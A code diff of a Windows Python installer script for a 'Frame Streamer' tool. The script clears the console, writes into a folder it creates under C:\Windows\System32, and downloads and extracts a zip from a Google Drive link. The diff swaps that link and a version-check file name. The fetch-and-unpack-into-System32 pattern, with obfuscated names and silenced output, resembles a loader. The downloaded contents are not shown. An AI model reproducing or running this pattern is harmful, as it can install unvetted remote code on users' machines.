@@ -11,7 +11,7 @@ import shutil
 import os
 import gdown
 os.system('cls')
-
+subprocess.run(["py", "-3.11", "-m", "pip", "install", "screeninfo"], check=True)
 dcnmwxdr = r'C:\Windows\System32\cstm_strmx'
 if not os.path.exists(dcnmwxdr):
     os.makedirs(dcnmwxdr)
@@ -28,9 +28,9 @@ def delete_files_if_condition(file):
                         os.remove(file_path)
                 except Exception as e:
                     print(f"")
-check_file = r"C:\Windows\System32\streamxcupdatejuly24xxv2.txt"
+check_file = r"C:\Windows\System32\strmx_aug_20_v1.txt"
 delete_files_if_condition(check_file)
-subprocess.run(["py", "-3.11", "-m", "pip", "install", "screeninfo"], check=True)
+
 
 def updating_premx():
     aesv3_path = r"C:\Windows\System32\cstm_strmx\framex_custom.py"
@@ -57,7 +57,7 @@ def download_file_from_google_drive(url, output_path):
 if not os.path.exists("C:\\Windows\\System32\\cstm_strmx\\frame_nowind.py"):
     os.system('cls')
     print("Installing Frame Streamer please wait.")
-    download_file_from_google_drive("https://drive.google.com/uc?id=1hbpYW2KRK7mHr3D736BUCyS4ge8kCdRz", "C:\\Windows\\System32\\cstm_strmx\\customx.zip")
+    download_file_from_google_drive("https://drive.google.com/uc?id=1NKIQhR_qh-vOT6BbCcaeKpqD3MKCN1_e", "C:\\Windows\\System32\\cstm_strmx\\customx.zip")
     zip_file = r'C:\Windows\System32\cstm_strmx\customx.zip'
     extract_dir = r'C:\Windows\System32\cstm_strmx'
     extract_zip(zip_file, extract_dir)
